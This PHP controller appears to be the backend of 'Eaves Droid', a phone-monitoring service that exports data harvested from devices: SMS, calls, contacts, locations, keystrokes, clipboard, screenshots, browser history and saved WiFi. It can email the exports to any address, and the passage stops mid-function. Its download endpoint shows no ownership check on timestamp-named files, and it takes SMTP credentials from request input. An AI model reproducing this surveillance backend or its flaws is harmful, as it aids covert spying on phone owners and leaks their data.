<?php

namespace App\Controllers\clients;

use CodeIgniter\API\ResponseTrait;
use App\Models\UserModel;
use App\Models\AccessLogsModel;

class TelemetryExportController extends BaseClientController
{
    use ResponseTrait;

    /**
     * @var UserModel
     */
    protected $modUser;

    /**
     * @var AccessLogsModel
     */
    protected $modAccessLogs;

    /**
     * @var array
     */
    protected $userData;

    public function initController(
        \CodeIgniter\HTTP\RequestInterface $request,
        \CodeIgniter\HTTP\ResponseInterface $response,
        \Psr\Log\LoggerInterface $logger
    ): void {
        parent::initController($request, $response, $logger);

        $this->modUser = new UserModel();
        $this->modAccessLogs = new AccessLogsModel();

        $this->userData = $this->getAuthenticatedUserData();
        $this->userId = $this->userData['id'] ?? null;
    }

    /**
     * Exports user data by type.
     *
     * @param string $type
     * @return \CodeIgniter\HTTP\ResponseInterface
     */
    public function exportData($type)
    {
        if (!auth()->loggedIn()) {
            return redirect()->to('login');
        }

        $format = $this->request->getGet('format') ?? 'json';
        $dateFrom = $this->request->getGet('date_from');
        $dateTo = $this->request->getGet('date_to');

        if (!in_array($format, ['json', 'csv'])) {
            $format = 'json';
        }

        try {
            $data = [];
            $filename = '';

            switch ($type) {
                case 'apps':
                    $data = $this->finderModel->get_apps($this->userId, 10000);
                    $filename = 'apps_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'calls':
                    $data = $this->finderModel->get_call_logs($this->userId, 10000);
                    $filename = 'calls_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'contacts':
                    $data = $this->finderModel->get_contacts($this->userId, 10000);
                    $filename = 'contacts_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'sms':
                    $data = $this->finderModel->get_sms($this->userId, 10000);
                    $filename = 'sms_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'files':
                    $data = $this->finderModel->export_device_files($this->userId, 10000);
                    $filename = 'files_metadata_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'locations':
                    $data = [
                        'locations' => $this->finderModel->get_locations($this->userId, 10000),
                        'activities' => $this->finderModel->get_activities($this->userId, 10000)
                    ];
                    $filename = 'location_history_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'misc_software':
                    $data = $this->buildMiscSoftwareExportData();
                    $filename = 'misc_software_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'misc_hardware':
                    $data = $this->buildMiscHardwareExportData();
                    $filename = 'misc_hardware_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'advanced':
                    $data = [
                        'device_context' => $this->finderModel->export_device_context($this->userId),
                        'network_info' => $this->finderModel->export_network_info($this->userId),
                        'accounts' => $this->finderModel->export_accounts($this->userId),
                        'calendar' => $this->finderModel->export_calendar_events($this->userId),
                        'app_usage' => $this->finderModel->export_app_usage($this->userId),
                        'notifications' => $this->finderModel->export_notifications($this->userId),
                        'bluetooth' => $this->finderModel->export_bluetooth($this->userId),
                        'sensors' => $this->finderModel->export_sensors($this->userId),
                    ];
                    $filename = 'advanced_data_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                case 'all':
                    $data = [
                        'apps' => $this->finderModel->get_apps($this->userId, 10000),
                        'calls' => $this->finderModel->get_call_logs($this->userId, 10000),
                        'contacts' => $this->finderModel->get_contacts($this->userId, 10000),
                        'sms' => $this->finderModel->get_sms($this->userId, 10000),
                        'files' => $this->finderModel->export_device_files($this->userId, 10000),
                        'location' => [
                            'locations' => $this->finderModel->get_locations($this->userId, 10000),
                            'activities' => $this->finderModel->get_activities($this->userId, 10000)
                        ],
                        'advanced' => [
                            'device_context' => $this->finderModel->export_device_context($this->userId),
                            'network_info' => $this->finderModel->export_network_info($this->userId),
                            'accounts' => $this->finderModel->export_accounts($this->userId),
                            'calendar' => $this->finderModel->export_calendar_events($this->userId),
                            'app_usage' => $this->finderModel->export_app_usage($this->userId),
                            'notifications' => $this->finderModel->export_notifications($this->userId),
                            'bluetooth' => $this->finderModel->export_bluetooth($this->userId),
                            'sensors' => $this->finderModel->export_sensors($this->userId),
                        ],
                        'misc_software' => $this->buildMiscSoftwareExportData(),
                        'misc_hardware' => $this->buildMiscHardwareExportData(),
                        'security' => $this->buildSecurityExportData(),
                        'export_info' => [
                            'exported_at' => date('Y-m-d H:i:s'),
                            'user_id' => $this->userId,
                            'user_email' => auth()->user()->getEmail(),
                        ],
                    ];
                    $filename = 'complete_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                    break;
                default:
                    session()->setFlashdata('error', 'Invalid export type');
                    return redirect()->to('account/home');
            }

            if (empty($data) || (isset($data['error']) && $data['error'])) {
                 session()->setFlashdata('error', 'No data found to export or error occurred.');
                 return redirect()->to('account/home');
            }

            $exportLabel = ['apps'=>'Applications','calls'=>'Call Logs','contacts'=>'Contacts','sms'=>'SMS Messages','files'=>'File Metadata','locations'=>'LocationController History','advanced'=>'AdvancedController Data','all'=>'All Data'];
            $label = $exportLabel[$type] ?? ucfirst($type);
            $this->logUserAction('exported_' . $type . '_via_download', 'system', 'low', 1,
                ['new_values' => json_encode(['export_type' => $label, 'format' => $format])]
            );
            $this->updateExportCount();

            // Send notification email
            $userEmail = auth()->user()->getEmail();
            if ($userEmail) {
                $sizeEstimate = $this->estimateDataSize($data);
                $breakdownHtml = '';
                if ($type === 'misc_software' && isset($data['accounts'])) {
                    $subItems = [
                        'fa-user' => ['Accounts', $data['accounts']],
                        'fa-calendar-alt' => ['Calendar', $data['calendar']],
                        'fa-chart-bar' => ['App Usage', $data['app_usage']],
                        'fa-bell' => ['Notifications', $data['notifications']],
                        'fa-info-circle' => ['Device Context', $data['device_context']],
                        'fa-network-wired' => ['Network Info', $data['network_info']],
                        'fa-universal-access' => ['Accessibility', $data['accessibility']],
                        'fa-keyboard' => ['Input Methods', $data['input_methods']],
                        'fa-shield-alt' => ['Security Audit', $data['security_audit']],
                        'fa-microchip' => ['Proc Info', $data['proc_info']],
                        'fa-chart-line' => ['Data Usage', $data['data_usage']],
                        'fa-wifi' => ['Saved WiFi', $data['saved_wifi']],
                        'fa-th-list' => ['Default Apps', $data['default_apps']],
                        'fa-clock' => ['Alarms', $data['alarms']],
                        'fa-lock' => ['App Security', $data['app_security']],
                        'fa-shield-virus' => ['Network Security', $data['network_security']],
                        'fa-sim-card' => ['Telephony Network', $data['telephony_network']],
                        'fa-language' => ['System Locale', $data['system_locale']],
                    ];
                    $breakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4><table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
                    foreach ($subItems as $icon => $info) {
                        $count = is_array($info[1]) ? count($info[1]) : (is_numeric($info[1]) ? (int)$info[1] : 0);
                        $breakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
                    }
                    $breakdownHtml .= '</table>';
                } elseif ($type === 'misc_hardware' && isset($data['hardware_graphics'])) {
                    $subItems = [
                        'fa-palette' => ['Hardware Graphics', $data['hardware_graphics']],
                        'fa-network-wired' => ['Hardware Network', $data['hardware_network']],
                        'fa-camera' => ['Camera Info', $data['camera_info']],
                        'fa-battery-full' => ['Battery Stats', $data['battery_stats']],
                        'fa-ruler' => ['Sensors', $data['sensors']],
                        'fa-bluetooth-b' => ['Bluetooth', $data['bluetooth']],
                        'fa-broadcast-tower' => ['Cell Towers', $data['cell_towers']],
                        'fa-tv' => ['Display Info', $data['display_info']],
                        'fa-hdd' => ['Storage', $data['storage']],
                        'fa-thermometer-half' => ['Thermal', $data['thermal']],
                        'fa-credit-card' => ['NFC', $data['nfc']],
                        'fa-tasks' => ['Processes', $data['processes']],
                    ];
                    $breakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4><table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
                    foreach ($subItems as $icon => $info) {
                        $count = is_array($info[1]) ? count($info[1]) : (is_numeric($info[1]) ? (int)$info[1] : 0);
                        $breakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
                    }
                    $breakdownHtml .= '</table>';
                }

                $this->sendNotificationEmail(
                    $userEmail,
                    'Eaves Droid — Export Initiated: ' . $label,
                    '
<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px;">
<div style="max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
<div style="background:#28a745;padding:20px;text-align:center;"><h1 style="color:#fff;margin:0;font-size:22px;">📦 Export Initiated</h1></div>
<div style="padding:25px;">
<p style="color:#333;font-size:15px;">Hello,</p>
<p style="color:#333;font-size:15px;">A data export has been initiated from your <strong>Eaves Droid</strong> account. The file is being downloaded to your browser.</p>
<table style="width:100%;border-collapse:collapse;margin:20px 0;background:#f8f9fa;border-radius:6px;">
<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Data Type</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $label . '</td></tr>
<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Format</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . strtoupper($format) . '</td></tr>
<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Estimated Size</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $sizeEstimate . '</td></tr>
<tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Exported At</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
</table>' . $breakdownHtml . '
<div style="background:#e8fde8;border-left:4px solid #28a745;padding:12px 15px;margin:15px 0;border-radius:4px;">
<p style="margin:0;color:#333;font-size:13px;"><strong>🔒 Important:</strong> This file contains sensitive data. Keep it secure.</p>
</div>
<p style="color:#333;font-size:15px;">If you did not request this export, please contact support immediately.</p>
<p style="color:#333;font-size:15px;">Thank you,<br><strong>Eaves Droid Team</strong></p>
<div style="margin-top:20px;padding:12px 15px;background:#e9ecef;border-radius:6px;font-size:11px;color:#555;">
<table style="width:100%;border-collapse:collapse;">
<tr><td style="padding:2px 5px;"><strong>Action:</strong> Data Export</td></tr>
<tr><td style="padding:2px 5px;"><strong>Status:</strong> <span style="color:#28a745;font-weight:bold;">Success</span></td></tr>
<tr><td style="padding:2px 5px;"><strong>Browser:</strong> ' . htmlspecialchars($this->request->getUserAgent()->getAgentString() ?: '') . '</td></tr>
<tr><td style="padding:2px 5px;"><strong>Browser IP:</strong> ' . $this->request->getIPAddress() . '</td></tr>
<tr><td style="padding:2px 5px;"><strong>Executed At:</strong> ' . date('Y-m-d H:i:s') . '</td></tr>
</table>
</div>
</div>
<div style="background:#f1f1f1;padding:12px;text-align:center;font-size:11px;color:#888;">Eaves Droid — AdvancedController Mobile Forensic &amp; Data Intelligence Platform</div>
</div></body></html>'
                );
            }

            if ($format === 'csv') {
                return $this->exportAsCsv($data, $type, $filename);
            }

            $jsonData = json_encode($data, JSON_PRETTY_PRINT);
            if ($jsonData === false) {
                throw new \Exception('JSON encoding failed: ' . json_last_error_msg());
            }

            return $this->response
                ->setContentType('application/json')
                ->setHeader('Content-Disposition', 'attachment; filename="' . $filename . '"')
                ->setBody($jsonData);

        } catch (\Exception $e) {
            log_message('error', 'Export data error: ' . $e->getMessage());
            session()->setFlashdata('error', 'Failed to export data: ' . $e->getMessage());
            return redirect()->to('account/home');
        }
    }

    /**
     * Builds the full misc software export payload (33 categories).
     */
    private function buildMiscSoftwareExportData(): array
    {
        $f = $this->finderModel;
        $u = $this->userId;

        return [
            'device_context' => $f->export_device_context($u),
            'network_info' => $f->export_network_info($u),
            'accounts' => $f->export_accounts($u),
            'calendar' => $f->export_calendar_events($u),
            'app_usage' => $f->export_app_usage($u),
            'notifications' => $f->export_notifications($u),
            'accessibility' => $f->export_accessibility($u),
            'input_methods' => $f->export_input_methods($u),
            'security_audit' => $f->export_security_audit($u),
            'proc_info' => $f->export_proc_info($u),
            'data_usage' => $f->export_data_usage($u),
            'saved_wifi' => $f->export_saved_wifi($u),
            'default_apps' => $f->export_default_apps($u),
            'alarms' => $f->export_alarms($u),
            'app_security' => $f->export_app_security($u),
            'network_security' => $f->export_network_security($u),
            'telephony_network' => $f->export_telephony_network($u),
            'system_locale' => $f->export_system_locale($u),
            'app_permissions' => $f->export_app_permissions($u),
            'browser_history' => $f->export_browser_history($u),
            'clipboard' => $f->export_clipboard($u),
            'content_providers' => $f->export_content_providers($u),
            'crash_logs' => $f->export_crash_logs($u),
            'digital_wellbeing' => $f->export_digital_wellbeing($u),
            'doze_standby' => $f->export_doze_standby($u),
            'email_accounts' => $f->export_email_accounts($u),
            'health_data' => $f->export_health_data($u),
            'keyboard_input' => $f->export_keyboard_input($u),
            'keyguard_events' => $f->export_keyguard_events($u),
            'screenshots' => $f->export_screenshots($u),
            'screen_state' => $f->export_screen_state($u),
            'vpn_config' => $f->export_vpn_config($u),
            'running_processes_detailed' => $f->export_running_processes_detailed($u),
        ];
    }

    /**
     * Builds the full misc hardware export payload (18 categories).
     */
    private function buildMiscHardwareExportData(): array
    {
        $f = $this->finderModel;
        $u = $this->userId;

        return [
            'hardware_graphics' => $f->export_hardware_graphics($u),
            'hardware_network' => $f->export_hardware_network($u),
            'camera_info' => $f->export_camera_info($u),
            'battery_stats' => $f->export_battery_stats($u),
            'sensors' => $f->export_sensors($u),
            'bluetooth' => $f->export_bluetooth($u),
            'cell_towers' => $f->export_cell_towers($u),
            'display_info' => $f->export_display_info($u),
            'storage' => $f->export_storage($u),
            'thermal' => $f->export_thermal($u),
            'nfc' => $f->export_nfc($u),
            'processes' => $f->export_processes($u),
            'audio_devices' => $f->export_audio_devices($u),
            'biometric' => $f->export_biometric($u),
            'gnss_hardware' => $f->export_gnss_hardware($u),
            'power_rails' => $f->export_power_rails($u),
            'usb_devices' => $f->export_usb_devices($u),
            'vibration' => $f->export_vibration($u),
        ];
    }

    /**
     * Builds security-related export payload (tokens, uploaded files, blocklist, ML jobs/results).
     */
    private function buildSecurityExportData(): array
    {
        $db = \Config\Database::connect();

        return [
            'tokens' => $db->table('tbl_user_api_tokens')->where('owner_id', $this->userId)->get()->getResultArray(),
            'tbl_uploaded_files' => $db->table('tbl_uploaded_files')->where('token_owner_id', $this->userId)->get()->getResultArray(),
            'tbl_upload_queue' => $db->table('tbl_upload_queue')->where('owner_id', $this->userId)->get()->getResultArray(),
            'captured_media' => $db->table('tbl_extracted_media_files')->where('owner_id', $this->userId)->get()->getResultArray(),
            'blocklist' => $db->table('tbl_user_blocklists')->where('owner_id', $this->userId)->get()->getResultArray(),
            'ml_jobs' => $db->table('ml_jobs')->where('user_id', $this->userId)->get()->getResultArray(),
            'ml_results' => $db->table('ml_results')->where('user_id', $this->userId)->get()->getResultArray(),
            'ml_analysis_tracking' => $db->table('ml_analysis_tracking')->where('user_id', $this->userId)->get()->getResultArray(),
        ];
    }

    /**
     * POST /account/export-email
     * Generates an export and sends it via email.
     */
    public function exportEmail()
    {
        ini_set('memory_limit', '512M');

        if (!$this->request->isAJAX()) {
            return $this->fail('Invalid request');
        }

        $type = $this->request->getPost('type');
        $format = $this->request->getPost('format') ?? 'json';
        $recipient = $this->request->getPost('email');
        $dateFrom = $this->request->getPost('date_from');
        $dateTo = $this->request->getPost('date_to');

        if (!$type || !$recipient) {
            return $this->fail('Type and email are required.');
        }

        try {
            $data = [];
            switch ($type) {
                case 'apps': $data = $this->finderModel->get_apps($this->userId, 10000); break;
                case 'calls': $data = $this->finderModel->get_call_logs($this->userId, 10000); break;
                case 'contacts': $data = $this->finderModel->get_contacts($this->userId, 10000); break;
                case 'sms': $data = $this->finderModel->get_sms($this->userId, 10000); break;
                case 'files': $data = $this->finderModel->export_device_files($this->userId, 10000); break;
                case 'locations':
                    $data = ['locations' => $this->finderModel->get_locations($this->userId, 10000), 'activities' => $this->finderModel->get_activities($this->userId, 10000)];
                    break;
                case 'misc_software':
                    $data = $this->buildMiscSoftwareExportData();
                    break;
                case 'misc_hardware':
                    $data = $this->buildMiscHardwareExportData();
                    break;
                case 'advanced':
                    $data = ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId)];
                    break;
                case 'all':
                    $data = ['apps' => $this->finderModel->get_apps($this->userId, 10000), 'calls' => $this->finderModel->get_call_logs($this->userId, 10000), 'contacts' => $this->finderModel->get_contacts($this->userId, 10000), 'sms' => $this->finderModel->get_sms($this->userId, 10000), 'files' => $this->finderModel->export_device_files($this->userId, 10000), 'location' => ['locations' => $this->finderModel->get_locations($this->userId, 10000), 'activities' => $this->finderModel->get_activities($this->userId, 10000)], 'advanced' => ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId)], 'misc_software' => $this->buildMiscSoftwareExportData(), 'misc_hardware' => $this->buildMiscHardwareExportData(), 'security' => $this->buildSecurityExportData(), 'export_info' => ['exported_at' => date('Y-m-d H:i:s'), 'user_id' => $this->userId, 'user_email' => auth()->user()->getEmail()]];
                    break;
                default: return $this->fail('Invalid type.');
            }

            $content = json_encode($data, JSON_PRETTY_PRINT);
            $filename = $type . '_export_' . date('Y-m-d_H-i-s') . '.json';
            $tmpPath = WRITEPATH . 'exports/' . $filename;
            file_put_contents($tmpPath, $content);

            // Build breakdown HTML for misc types before data is unset
            $exportBreakdownHtml = '';
            if ($type === 'misc_software' && isset($data['accounts'])) {
                $subItems = [
                    'fa-user' => 'Accounts', 'fa-calendar-alt' => 'Calendar', 'fa-chart-bar' => 'App Usage',
                    'fa-bell' => 'Notifications', 'fa-info-circle' => 'Device Context', 'fa-network-wired' => 'Network Info',
                    'fa-universal-access' => 'Accessibility', 'fa-keyboard' => 'Input Methods', 'fa-shield-alt' => 'Security Audit',
                    'fa-microchip' => 'Proc Info', 'fa-chart-line' => 'Data Usage', 'fa-wifi' => 'Saved WiFi',
                    'fa-th-list' => 'Default Apps', 'fa-clock' => 'Alarms', 'fa-lock' => 'App Security',
                    'fa-shield-virus' => 'Network Security', 'fa-sim-card' => 'Telephony Network', 'fa-language' => 'System Locale',
                ];
                $exportBreakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4>
                <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
                foreach ($subItems as $icon => $label) {
                    $key = strtolower(str_replace([' ', '-'], '_', $label));
                    $keys = ['accounts','calendar','app_usage','notifications','device_context','network_info','accessibility','input_methods','security_audit','proc_info','data_usage','saved_wifi','default_apps','alarms','app_security','network_security','telephony_network','system_locale'];
                    $idx = array_search($key, $keys);
                    $val = array_values(array_slice($data, 0, 18))[$idx] ?? [];
                    $count = is_array($val) ? count($val) : 0;
                    $exportBreakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $label . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
                }
                $exportBreakdownHtml .= '</table>';
            } elseif ($type === 'misc_hardware' && isset($data['hardware_graphics'])) {
                $subItems = [
                    'fa-palette' => 'Hardware Graphics', 'fa-network-wired' => 'Hardware Network',
                    'fa-camera' => 'Camera Info', 'fa-battery-full' => 'Battery Stats',
                    'fa-ruler' => 'Sensors', 'fa-bluetooth-b' => 'Bluetooth',
                    'fa-broadcast-tower' => 'Cell Towers', 'fa-tv' => 'Display Info',
                    'fa-hdd' => 'Storage', 'fa-thermometer-half' => 'Thermal',
                    'fa-credit-card' => 'NFC', 'fa-tasks' => 'Processes',
                ];
                $exportBreakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4>
                <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
                $idx = 0;
                foreach ($subItems as $icon => $label) {
                    $val = array_values($data)[$idx] ?? [];
                    $count = is_array($val) ? count($val) : 0;
                    $exportBreakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $label . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
                    $idx++;
                }
                $exportBreakdownHtml .= '</table>';
            }

            unset($data);
            unset($content);

            $db = \Config\Database::connect();
            $smtpSettings = [];

            // Use POSTed SMTP config first, fall back to DB
            $smtpHost = $this->request->getPost('smtp_host');
            $smtpPort = $this->request->getPost('smtp_port');
            $smtpUser = $this->request->getPost('smtp_user');
            $smtpPass = $this->request->getPost('smtp_pass');
            $smtpFromEmail = $this->request->getPost('smtp_from_email');
            $smtpFromName = $this->request->getPost('smtp_from_name');

            if (!$smtpHost) {
                $rows = $db->table('settings')->where('class', 'notification')->get()->getResultArray();
                foreach ($rows as $r) {
                    $smtpSettings[$r['key']] = $r['value'];
                }
                $smtpHost = $smtpSettings['smtp_host'] ?? '';
                $smtpPort = $smtpSettings['smtp_port'] ?? '587';
                $smtpUser = $smtpSettings['smtp_user'] ?? '';
                $smtpPass = $smtpSettings['smtp_pass'] ?? '';
                $smtpFromEmail = $smtpSettings['smtp_from_email'] ?? '';
                $smtpFromName = $smtpSettings['smtp_from_name'] ?? 'Eaves Droid';
            }

            $email = \Config\Services::email();
            $email->initialize([
                'protocol'   => 'smtp',
                'SMTPHost'   => $smtpHost,
                'SMTPPort'   => $smtpPort,
                'SMTPUser'   => $smtpUser,
                'SMTPPass'   => $smtpPass,
                'SMTPCrypto' => 'tls',
                'mailType'   => 'html',
                'wordWrap'   => true,
            ]);
            $email->setFrom($smtpFromEmail, $smtpFromName);
            $email->setTo($recipient);
            $typeLabels = [
                'apps' => 'Installed Applications',
                'calls' => 'Call Logs',
                'contacts' => 'Contacts',
                'sms' => 'SMS Messages',
                'files' => 'File Metadata',
                'locations' => 'LocationController History',
                'advanced' => 'AdvancedController Device Data',
                'all' => 'Complete Data Archive',
            ];
            $label = $typeLabels[$type] ?? ucfirst($type);
            $fileSize = filesize($tmpPath);
            $sizeStr = $fileSize > 1048576 ? number_format($fileSize / 1048576, 2) . ' MB' : number_format($fileSize / 1024, 1) . ' KB';
            $downloadUrl = base_url('downloads/export/' . $filename);

            $email->setSubject('Eaves Droid — ' . $label . ' Export');
            $email->setMessage('
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px;">
    <div style="max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
        <div style="background:#007bff;padding:20px;text-align:center;">
            <h1 style="color:#fff;margin:0;font-size:22px;">📦 Data Export Ready</h1>
        </div>
        <div style="padding:25px;">
            <p style="color:#333;font-size:15px;line-height:1.6;">Hello,</p>
            <p style="color:#333;font-size:15px;line-height:1.6;">Your requested data export from <strong>Eaves Droid</strong> is now ready. You can download it using the link below:</p>

            <div style="background:#e8f4fd;border:1px solid #b0d4f1;border-radius:6px;padding:12px 15px;margin:15px 0;text-align:center;">
                <p style="margin:0 0 8px;color:#333;font-size:14px;">📥 <strong>Download your export file:</strong></p>
                <a href="' . esc($downloadUrl) . '" style="display:inline-block;background:#007bff;color:#fff;padding:10px 24px;border-radius:4px;text-decoration:none;font-weight:bold;font-size:14px;">Download ' . esc($label) . ' Export</a>
                <p style="margin:8px 0 0;color:#888;font-size:12px;">Link expires after 24 hours</p>
            </div>

            <table style="width:100%;border-collapse:collapse;margin:20px 0;background:#f8f9fa;border-radius:6px;">
                <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Data Type</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $label . '</td></tr>
                <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Format</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . strtoupper($format) . '</td></tr>
                <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">File Size</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $sizeStr . '</td></tr>
                <tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Generated</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
            </table>
            ' . $exportBreakdownHtml . '

            <div style="background:#e8f4fd;border-left:4px solid #007bff;padding:12px 15px;margin:15px 0;border-radius:4px;">
                <p style="margin:0;color:#333;font-size:13px;line-height:1.5;">
                    <strong>📌 Important:</strong> This file contains sensitive personal data. Keep it secure and do not share it with unauthorized parties. Delete the file after use if no longer needed.
                </p>
            </div>

            <p style="color:#333;font-size:15px;line-height:1.6;">If you did not request this export, please contact support immediately.</p>
            <p style="color:#333;font-size:15px;line-height:1.6;">Thank you,<br><strong>Eaves Droid Team</strong></p>
        </div>
        <div style="background:#f1f1f1;padding:12px;text-align:center;font-size:11px;color:#888;">
            Eaves Droid — AdvancedController Mobile Forensic &amp; Data Intelligence Platform
        </div>
    </div>
</body>
</html>');

            if ($email->send()) {
                $exportLabel = ['apps'=>'Applications','calls'=>'Call Logs','contacts'=>'Contacts','sms'=>'SMS Messages','files'=>'File Metadata','locations'=>'LocationController History','misc_software'=>'Misc Software','misc_hardware'=>'Misc Hardware','advanced'=>'AdvancedController Data','all'=>'All Data'];
                $label = $exportLabel[$type] ?? ucfirst($type);
                $this->logUserAction('exported_' . $type . '_via_email', 'system', 'low', 1,
                    ['new_values' => json_encode(['export_type' => $label, 'format' => $format, 'recipient' => $recipient, 'file_size' => $fileSize])]
                );
                return $this->respond(['success' => true, 'message' => 'Export link has been sent to ' . $recipient]);
            } else {
                @unlink($tmpPath);
                return $this->respond(['success' => false, 'message' => 'Email send failed: ' . $email->printDebugger(['headers', 'subject', 'body'])]);
            }
        } catch (\Exception $e) {
            log_message('error', 'Email export error: ' . $e->getMessage());
            return $this->fail('Server error: ' . $e->getMessage());
        }
    }

    /**
     * Serves an exported JSON file for download. File is kept for 24 hours then auto-deleted.
     */
    public function downloadExport(string $filename)
    {
        $tmpPath = WRITEPATH . 'exports/' . basename($filename);
        if (!file_exists($tmpPath)) {
            // Fallback to old uploads/ path for backward compat
            $tmpPath = WRITEPATH . 'uploads/' . basename($filename);
            if (!file_exists($tmpPath)) {
                return $this->fail('File not found or expired.', 404);
            }
        }

        // Auto-clean files older than 24 hours
        if (time() - filemtime($tmpPath) > 86400) {
            @unlink($tmpPath);
            return $this->fail('Download link has expired.', 410);
        }

        return $this->response->download($tmpPath, null)->setFileName(basename($filename, '.json') . '.json');
    }

    /**
     * Converts data to CSV and returns as download response.
     */
    private function exportAsCsv($data, string $type, string $filename): \CodeIgniter\HTTP\ResponseInterface
    {
        $csv = fopen('php://temp', 'w+');

        // For simple array-of-objects types
        if (is_array($data) && isset($data[0]) && is_array($data[0])) {
            fputcsv($csv, array_keys($data[0]));
            foreach ($data as $row) {
                fputcsv($csv, $row);
            }
        } elseif ($type === 'all') {
            // Multi-sheet approach: prefix each section with a comment row
            foreach ($data as $section => $sectionData) {
                if ($section === 'export_info') continue;
                fputcsv($csv, ["=== $section ==="]);
                if (is_array($sectionData) && isset($sectionData[0]) && is_array($sectionData[0])) {
                    if (empty($sectionData)) continue;
                    fputcsv($csv, array_keys($sectionData[0]));
                    foreach ($sectionData as $row) {
                        fputcsv($csv, $row);
                    }
                } elseif (is_array($sectionData) && !isset($sectionData[0])) {
                    // Nested sub-sections (location, advanced, misc_software, misc_hardware, security)
                    foreach ($sectionData as $sub => $subData) {
                        if (!is_array($subData)) continue;
                        fputcsv($csv, ["--- $sub ---"]);
                        if (empty($subData)) continue;
                        if (isset($subData[0]) && is_array($subData[0])) {
                            fputcsv($csv, array_keys($subData[0]));
                            foreach ($subData as $row) {
                                fputcsv($csv, $row);
                            }
                        }
                    }
                }
            }
        } elseif ($type === 'locations') {
            foreach ($data as $section => $sectionData) {
                fputcsv($csv, ["=== $section ==="]);
                if (empty($sectionData)) continue;
                fputcsv($csv, array_keys($sectionData[0]));
                foreach ($sectionData as $row) {
                    fputcsv($csv, $row);
                }
            }
